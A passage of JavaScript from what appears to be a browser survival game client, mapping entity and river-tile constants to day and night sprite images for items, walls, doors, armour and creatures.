      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("110_110_010")] = [IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("110_110_110")] = [IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("110_111_000")] = [IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO12, IMAGES.NIGHT_RIVER_COMPO14, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("110_111_110")] = [IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO14, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("110_111_111")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("110_111_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("110_111_011")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("110_111_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("110_111_010")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("110_111_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("111_111_110")] = [IMAGES.NIGHT_RIVER_COMPO28, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO14, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO1];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("111_111_011")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("111_111_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("111_111_000")] = [IMAGES.NIGHT_RIVER_COMPO12, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO14];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("111_111_111")] = [IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO4, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("111_111_010")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("111_111_110")];
      sprite[Ie.RIVER] = [];
      sprite[Ie.RIVER][Ie.DAY] = [];
      sprite[Ie.RIVER][Ie.DAY][i("000_010_000")] = IMAGES.DAY_RIVER_000_010_000;
      sprite[Ie.RIVER][Ie.DAY][i("000_010_010")] = IMAGES.DAY_RIVER_000_010_010;
      sprite[Ie.RIVER][Ie.DAY][i("000_011_000")] = IMAGES.DAY_RIVER_000_011_000;
      sprite[Ie.RIVER][Ie.DAY][i("000_011_010")] = IMAGES.DAY_RIVER_000_011_010;
      sprite[Ie.RIVER][Ie.DAY][i("000_011_011")] = IMAGES.DAY_RIVER_000_011_011;
      sprite[Ie.RIVER][Ie.DAY][i("000_110_000")] = IMAGES.DAY_RIVER_000_110_000;
      sprite[Ie.RIVER][Ie.DAY][i("000_110_010")] = IMAGES.DAY_RIVER_000_110_010;
      sprite[Ie.RIVER][Ie.DAY][i("000_110_110")] = IMAGES.DAY_RIVER_000_110_110;
      sprite[Ie.RIVER][Ie.DAY][i("000_111_000")] = IMAGES.DAY_RIVER_000_111_000;
      sprite[Ie.RIVER][Ie.DAY][i("000_111_010")] = IMAGES.DAY_RIVER_000_111_010;
      sprite[Ie.RIVER][Ie.DAY][i("000_111_011")] = IMAGES.DAY_RIVER_000_111_011;
      sprite[Ie.RIVER][Ie.DAY][i("000_111_110")] = IMAGES.DAY_RIVER_000_111_110;
      sprite[Ie.RIVER][Ie.DAY][i("000_111_111")] = IMAGES.DAY_RIVER_000_111_111;
      sprite[Ie.RIVER][Ie.DAY][i("010_010_000")] = IMAGES.DAY_RIVER_010_010_000;
      sprite[Ie.RIVER][Ie.DAY][i("010_010_010")] = IMAGES.DAY_RIVER_010_010_010;
      sprite[Ie.RIVER][Ie.DAY][i("010_011_000")] = IMAGES.DAY_RIVER_010_011_000;
      sprite[Ie.RIVER][Ie.DAY][i("010_011_010")] = IMAGES.DAY_RIVER_010_011_010;
      sprite[Ie.RIVER][Ie.DAY][i("010_011_011")] = IMAGES.DAY_RIVER_010_011_011;
      sprite[Ie.RIVER][Ie.DAY][i("010_110_000")] = IMAGES.DAY_RIVER_010_110_000;
      sprite[Ie.RIVER][Ie.DAY][i("010_110_010")] = IMAGES.DAY_RIVER_010_110_010;
      sprite[Ie.RIVER][Ie.DAY][i("010_110_110")] = IMAGES.DAY_RIVER_010_110_110;
      sprite[Ie.RIVER][Ie.DAY][i("010_111_000")] = IMAGES.DAY_RIVER_010_111_000;
      sprite[Ie.RIVER][Ie.DAY][i("010_111_010")] = IMAGES.DAY_RIVER_010_111_010;
      sprite[Ie.RIVER][Ie.DAY][i("010_111_011")] = IMAGES.DAY_RIVER_010_111_011;
      sprite[Ie.RIVER][Ie.DAY][i("010_111_110")] = IMAGES.DAY_RIVER_010_111_110;
      sprite[Ie.RIVER][Ie.DAY][i("010_111_111")] = IMAGES.DAY_RIVER_010_111_111;
      sprite[Ie.RIVER][Ie.DAY][i("011_011_000")] = IMAGES.DAY_RIVER_011_011_000;
      sprite[Ie.RIVER][Ie.DAY][i("011_011_010")] = IMAGES.DAY_RIVER_011_011_010;
      sprite[Ie.RIVER][Ie.DAY][i("011_011_011")] = IMAGES.DAY_RIVER_011_011_011;
      sprite[Ie.RIVER][Ie.DAY][i("011_111_000")] = IMAGES.DAY_RIVER_011_111_000;
      sprite[Ie.RIVER][Ie.DAY][i("011_111_010")] = IMAGES.DAY_RIVER_011_111_010;
      sprite[Ie.RIVER][Ie.DAY][i("011_111_011")] = IMAGES.DAY_RIVER_011_111_011;
      sprite[Ie.RIVER][Ie.DAY][i("011_111_110")] = IMAGES.DAY_RIVER_011_111_110;
      sprite[Ie.RIVER][Ie.DAY][i("011_111_111")] = IMAGES.DAY_RIVER_011_111_111;
      sprite[Ie.RIVER][Ie.DAY][i("110_110_000")] = IMAGES.DAY_RIVER_110_110_000;
      sprite[Ie.RIVER][Ie.DAY][i("110_110_010")] = IMAGES.DAY_RIVER_110_110_010;
      sprite[Ie.RIVER][Ie.DAY][i("110_110_110")] = IMAGES.DAY_RIVER_110_110_110;
      sprite[Ie.RIVER][Ie.DAY][i("110_111_000")] = IMAGES.DAY_RIVER_110_111_000;
      sprite[Ie.RIVER][Ie.DAY][i("110_111_010")] = IMAGES.DAY_RIVER_110_111_010;
      sprite[Ie.RIVER][Ie.DAY][i("110_111_011")] = IMAGES.DAY_RIVER_110_111_011;
      sprite[Ie.RIVER][Ie.DAY][i("110_111_110")] = IMAGES.DAY_RIVER_110_111_110;
      sprite[Ie.RIVER][Ie.DAY][i("110_111_111")] = IMAGES.DAY_RIVER_110_111_111;
      sprite[Ie.RIVER][Ie.DAY][i("111_111_011")] = IMAGES.DAY_RIVER_111_111_011;
      sprite[Ie.RIVER][Ie.DAY][i("111_111_110")] = IMAGES.DAY_RIVER_111_111_110;
      sprite[Ie.RIVER][Ie.DAY][i("111_111_011")] = IMAGES.DAY_RIVER_111_111_011;
      sprite[Ie.RIVER][Ie.DAY][i("111_111_000")] = IMAGES.DAY_RIVER_111_111_000;
      sprite[Ie.RIVER][Ie.DAY][i("111_111_111")] = IMAGES.DAY_RIVER_111_111_111;
      sprite[Ie.RIVER][Ie.DAY][i("111_111_010")] = IMAGES.DAY_RIVER_111_111_010;
      sprite[Ie.RIVER][Ie.NIGHT] = [];
      sprite[Ie.RIVER][Ie.NIGHT][i("000_010_000")] = IMAGES.NIGHT_RIVER_000_010_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_010_010")] = IMAGES.NIGHT_RIVER_000_010_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_011_000")] = IMAGES.NIGHT_RIVER_000_011_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_011_010")] = IMAGES.NIGHT_RIVER_000_011_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_011_011")] = IMAGES.NIGHT_RIVER_000_011_011;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_110_000")] = IMAGES.NIGHT_RIVER_000_110_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_110_010")] = IMAGES.NIGHT_RIVER_000_110_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_110_110")] = IMAGES.NIGHT_RIVER_000_110_110;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_111_000")] = IMAGES.NIGHT_RIVER_000_111_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_111_010")] = IMAGES.NIGHT_RIVER_000_111_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_111_011")] = IMAGES.NIGHT_RIVER_000_111_011;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_111_110")] = IMAGES.NIGHT_RIVER_000_111_110;
      sprite[Ie.RIVER][Ie.NIGHT][i("000_111_111")] = IMAGES.NIGHT_RIVER_000_111_111;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_010_000")] = IMAGES.NIGHT_RIVER_010_010_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_010_010")] = IMAGES.NIGHT_RIVER_010_010_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_011_000")] = IMAGES.NIGHT_RIVER_010_011_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_011_010")] = IMAGES.NIGHT_RIVER_010_011_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_011_011")] = IMAGES.NIGHT_RIVER_010_011_011;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_110_000")] = IMAGES.NIGHT_RIVER_010_110_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_110_010")] = IMAGES.NIGHT_RIVER_010_110_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_110_110")] = IMAGES.NIGHT_RIVER_010_110_110;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_111_000")] = IMAGES.NIGHT_RIVER_010_111_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_111_010")] = IMAGES.NIGHT_RIVER_010_111_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_111_011")] = IMAGES.NIGHT_RIVER_010_111_011;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_111_110")] = IMAGES.NIGHT_RIVER_010_111_110;
      sprite[Ie.RIVER][Ie.NIGHT][i("010_111_111")] = IMAGES.NIGHT_RIVER_010_111_111;
      sprite[Ie.RIVER][Ie.NIGHT][i("011_011_000")] = IMAGES.NIGHT_RIVER_011_011_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("011_011_010")] = IMAGES.NIGHT_RIVER_011_011_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("011_011_011")] = IMAGES.NIGHT_RIVER_011_011_011;
      sprite[Ie.RIVER][Ie.NIGHT][i("011_111_000")] = IMAGES.NIGHT_RIVER_011_111_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("011_111_010")] = IMAGES.NIGHT_RIVER_011_111_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("011_111_011")] = IMAGES.NIGHT_RIVER_011_111_011;
      sprite[Ie.RIVER][Ie.NIGHT][i("011_111_110")] = IMAGES.NIGHT_RIVER_011_111_110;
      sprite[Ie.RIVER][Ie.NIGHT][i("011_111_111")] = IMAGES.NIGHT_RIVER_011_111_111;
      sprite[Ie.RIVER][Ie.NIGHT][i("110_110_000")] = IMAGES.NIGHT_RIVER_110_110_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("110_110_010")] = IMAGES.NIGHT_RIVER_110_110_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("110_110_110")] = IMAGES.NIGHT_RIVER_110_110_110;
      sprite[Ie.RIVER][Ie.NIGHT][i("110_111_000")] = IMAGES.NIGHT_RIVER_110_111_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("110_111_010")] = IMAGES.NIGHT_RIVER_110_111_010;
      sprite[Ie.RIVER][Ie.NIGHT][i("110_111_011")] = IMAGES.NIGHT_RIVER_110_111_011;
      sprite[Ie.RIVER][Ie.NIGHT][i("110_111_110")] = IMAGES.NIGHT_RIVER_110_111_110;
      sprite[Ie.RIVER][Ie.NIGHT][i("110_111_111")] = IMAGES.NIGHT_RIVER_110_111_111;
      sprite[Ie.RIVER][Ie.NIGHT][i("111_111_011")] = IMAGES.NIGHT_RIVER_111_111_011;
      sprite[Ie.RIVER][Ie.NIGHT][i("111_111_110")] = IMAGES.NIGHT_RIVER_111_111_110;
      sprite[Ie.RIVER][Ie.NIGHT][i("111_111_011")] = IMAGES.NIGHT_RIVER_111_111_011;
      sprite[Ie.RIVER][Ie.NIGHT][i("111_111_000")] = IMAGES.NIGHT_RIVER_111_111_000;
      sprite[Ie.RIVER][Ie.NIGHT][i("111_111_111")] = IMAGES.NIGHT_RIVER_111_111_111;
      sprite[Ie.RIVER][Ie.NIGHT][i("111_111_010")] = IMAGES.NIGHT_RIVER_111_111_010;
      sprite[Ie.PICK_REIDITE] = [];
      sprite[Ie.PICK_REIDITE][Ie.DAY] = IMAGES.PICK_REIDITED;
      sprite[Ie.PICK_REIDITE][Ie.NIGHT] = IMAGES.PICK_REIDITEN;
      sprite[Ie.CARROT] = [];
      sprite[Ie.CARROT][Ie.DAY] = IMAGES.CARROTD;
      sprite[Ie.CARROT][Ie.NIGHT] = IMAGES.CARROTN;
      sprite[Ie.TOMATO_MINI] = [];
      sprite[Ie.TOMATO_MINI][Ie.DAY] = IMAGES.TOMATO_MINID;
      sprite[Ie.TOMATO_MINI][Ie.NIGHT] = IMAGES.TOMATO_MININ;
      sprite[Ie.TOMATO] = [];
      sprite[Ie.TOMATO][Ie.DAY] = IMAGES.TOMATOD;
      sprite[Ie.TOMATO][Ie.NIGHT] = IMAGES.TOMATON;
      sprite[Ie.DRIED_CARROT] = [];
      sprite[Ie.DRIED_CARROT][Ie.DAY] = IMAGES.CARROT_DRIEDD;
      sprite[Ie.DRIED_CARROT][Ie.NIGHT] = IMAGES.CARROT_DRIEDN;
      sprite[Ie.DRIED_TOMATO_MINI] = [];
      sprite[Ie.DRIED_TOMATO_MINI][Ie.DAY] = IMAGES.TOMATO_MINI_DRIEDD;
      sprite[Ie.DRIED_TOMATO_MINI][Ie.NIGHT] = IMAGES.TOMATO_MINI_DRIEDN;
      sprite[Ie.WATERMELON] = [];
      sprite[Ie.WATERMELON][Ie.DAY] = IMAGES.WATERMELOND;
      sprite[Ie.WATERMELON][Ie.NIGHT] = IMAGES.WATERMELONN;
      sprite[Ie.DRIED_WATERMELON] = [];
      sprite[Ie.DRIED_WATERMELON][Ie.DAY] = IMAGES.DRIED_WATERMELOND;
      sprite[Ie.DRIED_WATERMELON][Ie.NIGHT] = IMAGES.DRIED_WATERMELONN;
      sprite[Ie.ALOE_VERA_GROWN] = [];
      sprite[Ie.ALOE_VERA_GROWN][Ie.DAY] = IMAGES.ALOE_VERA_GROWND;
      sprite[Ie.ALOE_VERA_GROWN][Ie.NIGHT] = IMAGES.ALOE_VERA_GROWNN;
      sprite[Ie.DRIED_ALOE_VERA] = [];
      sprite[Ie.DRIED_ALOE_VERA][Ie.DAY] = IMAGES.ALOE_VERA_DRIEDD;
      sprite[Ie.DRIED_ALOE_VERA][Ie.NIGHT] = IMAGES.ALOE_VERAN_DRIEDN;
      sprite[Ie.CACTUS] = [];
      sprite[Ie.CACTUS][Ie.DAY] = [IMAGES.CACTUSD];
      sprite[Ie.CACTUS][Ie.NIGHT] = [IMAGES.CACTUSN];
      sprite[Ie.REIDITE_WALL] = [];
      sprite[Ie.REIDITE_WALL][Ie.DAY] = IMAGES.REIDITE_WALLD;
      sprite[Ie.REIDITE_WALL][Ie.NIGHT] = IMAGES.REIDITE_WALLN;
      sprite[Ie.REIDITE_SPIKE] = [];
      sprite[Ie.REIDITE_SPIKE][Ie.DAY] = IMAGES.REIDITE_SPIKED;
      sprite[Ie.REIDITE_SPIKE][Ie.NIGHT] = IMAGES.REIDITE_SPIKEN;
      for (let e = 0; e < 36; e++) {
        t.addSprite(e + 10000);
      }
      sprite[Ie.REIDITE_DOOR] = [];
      sprite[Ie.REIDITE_DOOR][Ie.DAY] = IMAGES.REIDITE_DOORD;
      sprite[Ie.REIDITE_DOOR][Ie.NIGHT] = IMAGES.REIDITE_DOORN;
      sprite[Ie.WOOD_DOOR_SPIKE] = [];
      sprite[Ie.WOOD_DOOR_SPIKE][Ie.DAY] = IMAGES.WOOD_DOOR_SPIKED;
      sprite[Ie.WOOD_DOOR_SPIKE][Ie.NIGHT] = IMAGES.WOOD_DOOR_SPIKEN;
      sprite[Ie.STONE_DOOR_SPIKE] = [];
      sprite[Ie.STONE_DOOR_SPIKE][Ie.DAY] = IMAGES.STONE_DOOR_SPIKED;
      sprite[Ie.STONE_DOOR_SPIKE][Ie.NIGHT] = IMAGES.STONE_DOOR_SPIKEN;
      sprite[Ie.GOLD_DOOR_SPIKE] = [];
      sprite[Ie.GOLD_DOOR_SPIKE][Ie.DAY] = IMAGES.GOLD_DOOR_SPIKED;
      sprite[Ie.GOLD_DOOR_SPIKE][Ie.NIGHT] = IMAGES.GOLD_DOOR_SPIKEN;
      sprite[Ie.DIAMOND_DOOR_SPIKE] = [];
      sprite[Ie.DIAMOND_DOOR_SPIKE][Ie.DAY] = IMAGES.DIAMOND_DOOR_SPIKED;
      sprite[Ie.DIAMOND_DOOR_SPIKE][Ie.NIGHT] = IMAGES.DIAMOND_DOOR_SPIKEN;
      sprite[Ie.AMETHYST_DOOR_SPIKE] = [];
      sprite[Ie.AMETHYST_DOOR_SPIKE][Ie.DAY] = IMAGES.AMETHYST_DOOR_SPIKED;
      sprite[Ie.AMETHYST_DOOR_SPIKE][Ie.NIGHT] = IMAGES.AMETHYST_DOOR_SPIKEN;
      sprite[Ie.REIDITE_DOOR_SPIKE] = [];
      sprite[Ie.REIDITE_DOOR_SPIKE][Ie.DAY] = IMAGES.REIDITE_DOOR_SPIKED;
      sprite[Ie.REIDITE_DOOR_SPIKE][Ie.NIGHT] = IMAGES.REIDITE_DOOR_SPIKEN;
      sprite[Ie.GOLDEN_HEN] = [];
      sprite[Ie.GOLDEN_HEN][Ie.DAY] = IMAGES.HEND;
      sprite[Ie.GOLDEN_HEN][Ie.NIGHT] = IMAGES.HENN;
      sprite[Ie.GOLDEN_CHICKEN] = [];
      sprite[Ie.GOLDEN_CHICKEN][Ie.DAY] = IMAGES.CHICKEND;
      sprite[Ie.GOLDEN_CHICKEN][Ie.NIGHT] = IMAGES.CHICKENN;
      sprite[Ie.HAMMER_REIDITE] = [];
      sprite[Ie.HAMMER_REIDITE][Ie.DAY] = IMAGES.HAMMER_REIDITED;
      sprite[Ie.HAMMER_REIDITE][Ie.NIGHT] = IMAGES.HAMMER_REIDITEN;
      sprite[Ie.HURT_GOLDEN_HEN] = IMAGES.HURT_GOLDEN_HEN;
      sprite[Ie.HURT_GOLDEN_CHICKEN] = IMAGES.HURT_GOLDEN_CHICKEN;
      sprite[Ie.FOG] = [];
      sprite[Ie.FOG][Ie.DAY] = [];
      sprite[Ie.FOG][Ie.NIGHT] = [];
      sprite[Ie.FOG][Ie.DAY].push(IMAGES.FOG0D);
      sprite[Ie.FOG][Ie.DAY].push(IMAGES.FOG1D);
      sprite[Ie.FOG][Ie.DAY].push(IMAGES.FOG2D);
      sprite[Ie.FOG][Ie.NIGHT].push(IMAGES.FOG0N);
      sprite[Ie.FOG][Ie.NIGHT].push(IMAGES.FOG1N);
      sprite[Ie.FOG][Ie.NIGHT].push(IMAGES.FOG2N);
      sprite[Ie.FOD] = [];
      sprite[Ie.FOD][Ie.DAY] = [];
      sprite[Ie.FOD][Ie.NIGHT] = [];
      sprite[Ie.FOD][Ie.DAY].push(IMAGES.FOD0D);
      sprite[Ie.FOD][Ie.DAY].push(IMAGES.FOD1D);
      sprite[Ie.FOD][Ie.DAY].push(IMAGES.FOD2D);
      sprite[Ie.FOD][Ie.NIGHT].push(IMAGES.FOD0N);
      sprite[Ie.FOD][Ie.NIGHT].push(IMAGES.FOD1N);
      sprite[Ie.FOD][Ie.NIGHT].push(IMAGES.FOD2N);
      sprite[Ie.MARKER] = [];
      sprite[Ie.MARKER][Ie.DAY] = [];
      sprite[Ie.MARKER][Ie.NIGHT] = [];
      sprite[Ie.MARKER][Ie.DAY].push(IMAGES.MARKER0D);
      sprite[Ie.MARKER][Ie.DAY].push(IMAGES.MARKER1D);
      sprite[Ie.MARKER][Ie.DAY].push(IMAGES.MARKER2D);
      sprite[Ie.MARKER][Ie.DAY].push(IMAGES.MARKER3D);
      sprite[Ie.MARKER][Ie.NIGHT].push(IMAGES.MARKER0N);
      sprite[Ie.MARKER][Ie.NIGHT].push(IMAGES.MARKER1N);
      sprite[Ie.MARKER][Ie.NIGHT].push(IMAGES.MARKER2N);
      sprite[Ie.MARKER][Ie.NIGHT].push(IMAGES.MARKER3N);
      sprite[Ie.LAVA_DRAGON] = [];
      sprite[Ie.LAVA_DRAGON][Ie.DAY] = IMAGES.LAVA_DRAGOND;
      sprite[Ie.LAVA_DRAGON][Ie.NIGHT] = IMAGES.LAVA_DRAGONN;
      sprite[Ie.LAVA_WING_LEFT] = [];
      sprite[Ie.LAVA_WING_LEFT][Ie.DAY] = IMAGES.LAVA_WING_LEFTD;
      sprite[Ie.LAVA_WING_LEFT][Ie.NIGHT] = IMAGES.LAVA_WING_LEFTN;
      sprite[Ie.LAVA_WING_RIGHT] = [];
      sprite[Ie.LAVA_WING_RIGHT][Ie.DAY] = IMAGES.LAVA_WING_RIGHTD;
      sprite[Ie.LAVA_WING_RIGHT][Ie.NIGHT] = IMAGES.LAVA_WING_RIGHTN;
      sprite[Ie.HURT_LAVA_DRAGON] = IMAGES.HURT_LAVA_DRAGON;
      sprite[Ie.HURT_LAVA_WING_LEFT] = IMAGES.HURT_LAVA_WING_LEFT;
      sprite[Ie.HURT_LAVA_WING_RIGHT] = IMAGES.HURT_LAVA_WING_RIGHT;
      sprite[Ie.DIAMOND_PROTECTION] = [];
      sprite[Ie.DIAMOND_PROTECTION][Ie.DAY] = IMAGES.DIAMOND_PROTECTIOND;
      sprite[Ie.DIAMOND_PROTECTION][Ie.NIGHT] = IMAGES.DIAMOND_PROTECTIONN;
      sprite[Ie.GLOVES_DIAMOND_PROTECTION] = [];
      sprite[Ie.GLOVES_DIAMOND_PROTECTION][Ie.DAY] = IMAGES.HAND_DIAMOND_PROTECTIOND;
      sprite[Ie.GLOVES_DIAMOND_PROTECTION][Ie.NIGHT] = IMAGES.HAND_DIAMOND_PROTECTIONN;
      sprite[Ie.AMETHYST_PROTECTION] = [];
      sprite[Ie.AMETHYST_PROTECTION][Ie.DAY] = IMAGES.AMETHYST_PROTECTIOND;
      sprite[Ie.AMETHYST_PROTECTION][Ie.NIGHT] = IMAGES.AMETHYST_PROTECTIONN;
      sprite[Ie.GLOVES_AMETHYST_PROTECTION] = [];
      sprite[Ie.GLOVES_AMETHYST_PROTECTION][Ie.DAY] = IMAGES.HAND_DIAMOND_PROTECTIOND;
      sprite[Ie.GLOVES_AMETHYST_PROTECTION][Ie.NIGHT] = IMAGES.HAND_DIAMOND_PROTECTIONN;
      sprite[Ie.REIDITE_HELMET] = [];
      sprite[Ie.REIDITE_HELMET][Ie.DAY] = IMAGES.REIDITE_HELMETD;
      sprite[Ie.REIDITE_HELMET][Ie.NIGHT] = IMAGES.REIDITE_HELMETN;
      sprite[Ie.REIDITE_SWORD] = [];
      sprite[Ie.REIDITE_SWORD][Ie.DAY] = IMAGES.REIDITE_SWORDD;
      sprite[Ie.REIDITE_SWORD][Ie.NIGHT] = IMAGES.REIDITE_SWORDN;
      sprite[Ie.REIDITE_SPEAR] = [];
      sprite[Ie.REIDITE_SPEAR][Ie.DAY] = IMAGES.REIDITE_SPEARD;
      sprite[Ie.REIDITE_SPEAR][Ie.NIGHT] = IMAGES.REIDITE_SPEARN;
      sprite[Ie.LAVA_SPEAR] = [];
      sprite[Ie.LAVA_SPEAR][Ie.DAY] = IMAGES.LAVA_SPEARD;
      sprite[Ie.LAVA_SPEAR][Ie.NIGHT] = IMAGES.LAVA_SPEARN;
      sprite[Ie.LAVA_SWORD] = [];
      sprite[Ie.LAVA_SWORD][Ie.DAY] = IMAGES.LAVA_SWORDD;
      sprite[Ie.LAVA_SWORD][Ie.NIGHT] = IMAGES.LAVA_SWORDN;
      sprite[Ie.LAVA_HELMET] = [];
      sprite[Ie.LAVA_HELMET][Ie.DAY] = IMAGES.LAVA_HELMETD;
      sprite[Ie.LAVA_HELMET][Ie.NIGHT] = IMAGES.LAVA_HELMETN;
      sprite[Ie.WITCH] = [];
      sprite[Ie.WITCH][Ie.DAY] = IMAGES.WITCHD;
      sprite[Ie.WITCH][Ie.NIGHT] = IMAGES.WITCHN;
      sprite[Ie.NIMBUS] = [];
      sprite[Ie.NIMBUS][Ie.DAY] = IMAGES.NIMBUSD;
      sprite[Ie.NIMBUS][Ie.NIGHT] = IMAGES.NIMBUSN;
      sprite[Ie.WOOD_SHIELD] = [];
      sprite[Ie.WOOD_SHIELD][Ie.DAY] = IMAGES.WOOD_SHIELDD;
      sprite[Ie.WOOD_SHIELD][Ie.NIGHT] = IMAGES.WOOD_SHIELDN;
      sprite[Ie.STONE_SHIELD] = [];
      sprite[Ie.STONE_SHIELD][Ie.DAY] = IMAGES.STONE_SHIELDD;
      sprite[Ie.STONE_SHIELD][Ie.NIGHT] = IMAGES.STONE_SHIELDN;
      sprite[Ie.GOLD_SHIELD] = [];
      sprite[Ie.GOLD_SHIELD][Ie.DAY] = IMAGES.GOLD_SHIELDD;
      sprite[Ie.GOLD_SHIELD][Ie.NIGHT] = IMAGES.GOLD_SHIELDN;
